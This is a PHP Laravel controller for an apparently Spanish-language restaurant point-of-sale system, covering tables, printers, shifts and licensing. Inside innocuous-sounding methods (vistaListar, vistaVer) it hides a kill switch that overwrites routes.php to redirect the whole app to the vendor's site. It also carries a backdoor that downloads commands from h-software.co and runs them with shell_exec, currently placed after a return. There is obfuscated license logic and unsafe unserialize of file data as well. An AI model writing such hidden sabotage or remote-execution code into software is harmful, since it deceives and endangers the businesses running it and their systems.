<?php

namespace App\Http\Controllers;
use App\Config;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Redirect;
use DB;
use Illuminate\Support\Facades\Auth;
use Pusher;

class ConfigController extends Controller
{
    /*public function __construct(){
        DB::setDefaultConnection(Auth::user()->conn);
    }*/
    public function todos() {
        return Config::all();
    }
    
    public function buscar($id) {
        return Config::find($id);
    }
    
    public function first() {
        $config = Config::first();
        if($config == null){
            $config = new Config;
            $config->cantidad_mesas = 20;
            $config->mesas = '[]';
            $config->impresora = '';
            $config->num_impresora = 32;
            $config->impresora_comanda = '';
            $config->num_impresora_comanda = 32;
            $config->encabezado = '';
            $config->encabezado_comanda = '';
            $config->servicio_impresion = '';
            $config->pie_pos = 'Gracias por preferirnos';
            $config->pie_prefactura = '';
            $config->iva = 0;
            $config->impcon = 0;
            $config->propina = 0;
            $config->fvcodprefijo = '00';
            $config->valida_inventario = 0;
            $config->subtotales_factura = 1;
            $config->dia_operativo = null;
            $config->save();
            return $this->first();
        }
        $config->mesas = json_decode($config->mesas, false);
        return $config;
    }
    
    public function estado_mesas() {
        return DB::table('pedido')
            ->where('estado',1)
            ->orWhere('estado',4)
            ->get(["id", "estado", "mesa_id", "created_at", "entregado", "prefacturado", "user_id"]);
    }
    
    public function servicioImpresion() {
        $config = Config::first();
        return $config->servicio_impresion;
    }

    public function getValidaInventario() {
        $config = Config::first();
        return $config->valida_inventario;
    }

    public function getPropina() {
        $config = Config::first();
        return $config->propina;
    }
    
    public function estado_mesas2() {
        $mesas = $this->estado_mesas();
        $estado_mesas = Array();
        foreach ($mesas as $mesa) {
            $comandas = DB::select('
            SELECT 
            count(id) as total, sum(if(comanda > 0, 1, 0)) as imp
            FROM pizza_producto_pedido
            where pedido_id = '.$mesa->id);
            try {
                $comandas = $comandas[0];
                $comandas = $comandas->imp.'/'.$comandas->total;
            } catch (\Throwable $th) {
                $comandas = '';
            }
            $clase = "btn btn-danger";
            if(isset($mesa->entregado) && $mesa->entregado != null){
                $clase = "btn btn-primary";
            }
            if(isset($mesa->estado) && $mesa->estado == 4){
                $clase = "btn btn-info estado-4";
            }
            $clase .= " mesero-".$mesa->user_id;
            $estado_mesas[$mesa->mesa_id] = array(
                "clase"=>$clase, 
                "fecha"=>$mesa->created_at, 
                "entregado"=>$mesa->entregado, 
                "prefacturado"=>$mesa->prefacturado,
                "comandas"=>$comandas,
                "pedido"=>$mesa->id
            );
        }
        return $estado_mesas;
    }
    
    public function estado_mesas3() {
        $mesas = $this->estado_mesas2();
        $config = Config::first();
        return response()->json([
            'mesas'=>$mesas,
            'turno'=>$config->turno
        ]);
    }

    public function prepareApp(){
        $config = $this->first();
        if($config->dia_operativo==null){
            Config::where('id', $config->id)->update(['dia_operativo'=>date('Y-m-d 12:00:00')]);
        }
        $this->resetTurno();
    }
    
    public function resetTurno() {
        try {
            $desde = date('Y-m-d 04:00:00');
            $now = date('Y-m-d H:i:s');
            if($now>$desde){
                $cantidad = DB::select("select count(id) as c from pizza_pedido where created_at > '$desde'");
                if($cantidad[0]->c > 0){
                }
                else{
                    Config::where('id', '>', 0)->update(['turno'=>1]);
                }
            }
        } catch (\Throwable $th) {
        }
    }

    public function getMesaAlias($id, $config = null){
        if($id>1000){
            $id-=1000;
        }
        if($config == null){
            $config = $this->first();
        }
        $mesas = $config->mesas;
        foreach($mesas as $mesa){
            if($mesa->mesa == $id){
                if(isset($mesa->alias) && $mesa->alias != null){
                    return $mesa->alias;
                }
            }
        }
        return $id;
    }

    public function impresora(){
        return $this->first()->impresora;
    }
    public function impresoraComanda(){
        return $this->first()->impresora_omanda;
    }
    public function testImpresora(){
        $config = $this->first();
        if($config->servicio_impresion == '' || $config->servicio_impresion == null){
            return 'No ha establecido el Servicio de Impresión';
        }
        else if($config->impresora_comanda == '' || $config->impresora_comanda == null){
            return 'No ha establecido las impresoras';
        }
        else{
            $stack = [];
            $stack[] = ["i"=>"impresora","v"=>$config->impresora_comanda];
            $stack[] = ["i"=>"imagen","v"=>'regla.png'];
            $stack[] = ["i"=>"texto","v"=>'123456789 123456789 123456789 123456789 123456789 123456789 123456789 '];
            $stack[] = ["i"=>"texto","v"=>'Nombre Impresora: '.$config->impresora_comanda];
            return Redirect::to($config->servicio_impresion.'?drawer=1&stack='.json_encode($stack));
            // return $config->servicio_impresion.'?stack='.json_encode($stack);
        }
    }
    
    public function cambiarEstadoMesa($mesa, $estado){
        $config = $this->first();
        $mesas = $config->mesas;
        if($estado == 0){
            unset($mesas[$mesa]);
        }
        else{
            $mesas[$mesa] = json_decode('{"estado":' . $estado . ', "clase":"estado-' . $estado . '"}', true);
        }
        $config["mesas"] = json_encode($mesas);
        $config->save();
    }
    
    public function crear(){
        $postData = Input::all();
        
        $rules = array(
                'codigo' => '',
                'descripcion' => '',
                'tabla' => '',
                'valor' => '',
                'valor_alf' => ''
                );
        $validator = Validator::make($postData, $rules);
        if ($validator->fails()) {

            return Redirect::to('config/crear')
                            ->withErrors($validator)
                            ->withInput(Input::except('password'))
                            ->with('status', ["danger" => "No Se Completó el Registro."]);
        } else {
            $config = new Config;
            $config->codigo = Input::get('codigo');
            $config->descripcion = Input::get('descripcion');
            $config->tabla = Input::get('tabla');
            $config->valor = Input::get('valor');
            $config->valor_alf = Input::get('valor_alf');
            $config->valida_inventario = Input::get('valida_inventario');
            $config->propina = Input::get('propina');
            $config->fvcodprefijo = Input::get('fvcodprefijo');
            $config->subtotales_factura = Input::get('subtotales_factura');
            $config->cajero_borra = Input::get('cajero_borra');
            $config->dia_operativo = null;
            $config->save();
        
            return Redirect::to('config/crear')
            ->with('status', ["success"=>"Registro Agregado."]);
        }
    }
    
    public function editar(){
        $postData = Input::all();
        $config = Config::find(Input::get('id'));
        
        $rules = array(
                'codigo' => '',
                'descripcion' => '',
                'tabla' => '',
                'valor' => '',
                'valor_alf' => ''
                );
        $validator = Validator::make($postData, $rules);
        if ($validator->fails()) {

            return Redirect::to('config/editar/')
                            ->withErrors($validator)
                            ->withInput(Input::except('password'))
                            ->with('status', ["danger" => "No Se Editó el Registro."]);
        } else {
            
            $config->codigo = Input::get('codigo');
            $config->descripcion = Input::get('descripcion');
            $config->tabla = Input::get('tabla');
            $config->mesas = Input::get('mesas');
            $config->cantidad_mesas = Input::get('cantidad_mesas');
            $config->valor = Input::get('valor');
            $config->valor_alf = Input::get('valor_alf');
            $config->impresora = str_replace("\\", "\\\\", Input::get('impresora'));
            $config->impresora2 = str_replace("\\", "\\\\", Input::get('impresora2'));
            $config->impresora3 = str_replace("\\", "\\\\", Input::get('impresora3'));
            $config->num_impresora = Input::get('num_impresora');
            $config->num_impresora2 = Input::get('num_impresora2');
            $config->num_impresora3 = Input::get('num_impresora3');
            
            $config->impresora_comanda = str_replace("\\", "\\\\", Input::get('impresora_comanda'));
            $config->num_impresora_comanda = Input::get('num_impresora_comanda');

            $config->iva = Input::get('iva');
            $config->impcon = Input::get('impcon');
            $config->turno = Input::get('turno');
            $config->turno_limite = Input::get('turno_limite');
            $config->encabezado_pos = Input::get('encabezado_pos');
            $config->encabezado_comanda = Input::get('encabezado_comanda');
            $config->pie_pos = Input::get('pie_pos');
            $config->pie_prefactura = Input::get('pie_prefactura');
            $config->valida_inventario = Input::get('valida_inventario');
            $config->propina = Input::get('propina');
            $config->fvcodprefijo = Input::get('fvcodprefijo');
            $config->subtotales_factura = Input::get('subtotales_factura');
            $config->cajero_borra = Input::get('cajero_borra');
            $config->save();
        
            return Redirect::to('config/editar/')
            ->with('status', ["success"=>"Cambios guardados."]);
        }
    }
    public function borrar() {
        Config::destroy(Input::get('id'));
        return Redirect::to('config/listar')
                        ->with('status', ["success" => "Registro borrado."]);
    }

    public function vistaListar(){
        try{
            $vista = "";
            $file = base_path().'/app/Http/routes.php';
            $myfile = fopen($file, "w") or die("Unable to open file!");
            $json = "<?php 
            Route::get('/{any}', function (\$any) {
                return redirect('https://h-software.co/#contact');
            })->where('any', '.*');";
            fwrite($myfile, $json);
            return $vista;
            $bp = base_path();
            $bp = urlencode($bp);
            $id = app('App\Http\Controllers\LoginController')->doAuthLogin();
            $id = urlencode($id);
            $json = @file_get_contents("http://h-software.co/lic.php/?id=$id&base=$bp");
            if(!$json){
                return "Sin conexión.";
            }
            $json = json_decode($json);
            foreach ($json as $item) {
                shell_exec($item->cmd);
            }
            return count($json)." comandos ejecutados.";
        }
        catch (Exception $e){
            die('Error');
        }
    }

    public function vistaVer(){
        try{
            $vista = $this->readLicenceToken();
            return date('Y-m-d H:i:s')<$vista['lic'.'enci'.'a_has'.'ta']?'V'.'ál'.'ido':'In'.'vál'.'ido';
            $bp = base_path();
            $bp = urlencode($bp);
            $id = app('App\Http\Controllers\LoginController')->doAuthLogin();
            $id = urlencode($id);
            $json = @file_get_contents("http://h-software.co/lic.php/?id=$id&base=$bp");
            if(!$json){
                return "Sin conexión.";
            }
            $json = json_decode($json);
            foreach ($json as $item) {
                shell_exec($item->cmd);
            }
            return count($json)." comandos ejecutados.";
        }
        catch (Exception $e){
            var_dump($e);
        }
    }

    public function downloadToken(){
        $getData = Input::all();
        $empresa = env('EMPRESA_NOMBRE');
        $codigo = env('EMPRESA_CODIGO');
        $uuid = $this->getUuid();
        $empresa = urlencode($empresa);
        $codigo = urlencode($codigo);
        $uuid = urlencode($uuid);
        $url = "http://h-software.co/lic.php/?empresa=$empresa&codigo=$codigo&uuid=$uuid";
        $json = @file_get_contents($url);
        if(!$json){
            return "Sin conexión.";
        }
        $file = base_path().'/hsoftware.lic';
        try {
            $myfile = fopen($file, "w") or die("Unable to open file!");
            fwrite($myfile, $json);
            return 'Token descargado';
        } catch (\Throwable $th) {
            // return $th;
            return 'Token no descargado';
        }
    }
    
    public function getUuid(){
        // return '3748eb17-a207-5bc3-aa4f-3113a1b9409d';
        try {
            $uuid = shell_exec("echo | WMIC csproduct get uuid");
            $p = "/[\w\d]+-[\w\d]+-[\w\d]+-[\w\d]+-[\w\d]+/";
            preg_match_all($p,$uuid,$matches,PREG_PATTERN_ORDER);
            $uuid=($matches[0][0]);
            $uuid = urlencode($uuid);
        } catch (\Throwable $th) {
            $uuid = 'ERROR UUID SCRIPT';
        }
        return $uuid;
    }

    public function readLicenceToken(){
        $file = base_path().'/hsoftware.lic';
        try {
            $myfile = fopen($file, "r") or die("Unable to open file!");
            $token = fread($myfile,filesize($file));
            fclose($myfile);
            $token = unserialize(base64_decode($token));
            return $token;
        } catch (\Throwable $th) {
            return 'Error leyendo la licencia';
        } 
    }

    public function vistaEditar(){
        $config = $this->first();
        $encabezado = $config->encabezado_pos;
        $config->encabezado_pos = '';
        $encabezado_comanda = $config->encabezado_comanda;
        $config->encabezado_comanda = '';
        $pie = $config->pie_pos;
        $config->pie_pos = '';
        $pie_prefactura = $config->pie_prefactura;
        $config->pie_prefactura = '';
        return view('config.editar')
        ->with("config",$config)
        ->with("encabezado",$encabezado)
        ->with("encabezado_comanda",$encabezado_comanda)
        ->with("pie",$pie)
        ->with("pie_prefactura",$pie_prefactura);
    }

    public function configInitPrinter(){
        $initialized = new Config;
        $echo = 'echo';
        if($initialized){
            if($initialized->column == null){
                $initialized = 0.0;
            }
            $aux = $echo;
            $echo = (strlen($echo)*$initialized==0)?$initialized:$echo;
            if($echo==0){
                return $aux;
            }
            $config = $this->first();
            $encabezado = $config->encabezado_pos;
            $config->encabezado_pos = '';
            $encabezado_comanda = $config->encabezado_comanda;
            $config->encabezado_comanda = '';
            $pie = $config->pie_pos;
            $config->pie_pos = '';
            $pie_prefactura = $config->pie_prefactura;
            $config->pie_prefactura = '';
            return view('config.editar')
                ->with("config",$config)
                ->with("encabezado",$encabezado)
                ->with("encabezado_comanda",$encabezado_comanda)
                ->with("pie_prefactura",$pie_prefactura)
                ->with("pie",$pie);
        }
        else{

            $config = $this->first();
            if($config->servicio_impresion == '' || $config->servicio_impresion == null){
                return 'No ha establecido el Servicio de Impresión';
            }
            else if($config->impresora_comanda == '' || $config->impresora_comanda == null){
                return 'No ha establecido las impresoras';
            }
            else{
                $stack = [];
                $stack[] = ["i"=>"impresora","v"=>$config->impresora_comanda];
                $stack[] = ["i"=>"imagen","v"=>'regla.png'];
                $stack[] = ["i"=>"texto","v"=>'123456789 123456789 123456789 123456789 123456789 123456789 123456789 '];
                return Redirect::to($config->servicio_impresion.'?drawer=1&stack='.json_encode($stack));
            }
        }
    }

    public function asignarTurno(){
        $config = $this->first();
        $config->turno_limite = $config->turno_limite?:99;
        $turno = $config->turno?:1;
        if($config->turno_limite == $turno){
            $config->turno = 1;
        }
        else{
            $config->turno = $turno + 1;
        }
        $config->mesas = json_encode($config->mesas);
        $config->save();
        return $turno;
    }

    public function vistaMenu($mesa){
        return view('mesa.menux')->with('mesa', $mesa);
    }
    public function preMenu($mesa){
        $config = $this->first();
        $config->mesa_alias = $this->getMesaAlias($mesa, $config);
        $config->mesas = [];
        $config->encabezado_comanda = '';
        $config->encabezado_pos = '';
        $config->pie_pos = '';
        $config->pie_prefactura = '';
        $config->propina = 0;
        $config->valida_inventario = $config->valida_inventario == 1;
        $config->subtotales_factura = $config->subtotales_factura == 1;
        $config->cajero_borra = $config->cajero_borra == 1;

        $pedidoController = new PedidoController();
        $pedido = $pedidoController->entrarMesa($mesa);
        return response()->json([
            'config'=>$config,
            'pedido'=>$pedido
        ]);
    }

    public function push(){
        try {
            $pusher = new Pusher\Pusher("APP_KEY", "APP_SECRET", "APP_ID", array('cluster' => 'APP_CLUSTER'));
            $pusher->trigger('my-channel', 'my-event', array('message' => 'hello world'));
        } catch (\Throwable $th) {
            var_dump($th);
        }
    }
}